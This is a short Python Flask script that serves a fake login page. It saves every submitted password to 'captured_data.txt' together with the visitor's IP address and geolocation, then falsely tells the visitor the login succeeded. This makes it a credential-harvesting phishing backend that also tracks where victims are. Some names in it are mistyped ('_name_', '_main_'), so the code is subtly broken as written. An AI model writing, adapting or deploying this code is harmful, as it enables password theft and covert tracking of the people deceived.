from flask import Flask, request, render_template
import requests
import json

app = Flask(_name_)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    ip = request.remote_addr
    password = request.form['password']

    # Get location using an IP geolocation API
    response = requests.get(f'http://ip-api.com/json/{ip}')
    location = response.json()

    # Save data to a .txt file
    with open('captured_data.txt', 'a') as file:
        file.write(f"IP: {ip}\n")
        file.write(f"Location: {location}\n")
        file.write(f"Password: {password}\n")
        file.write("----------\n")

    return "Login Successful"

if _name_ == '_main_':
    app.run(host='0.0.0.0', port=8080)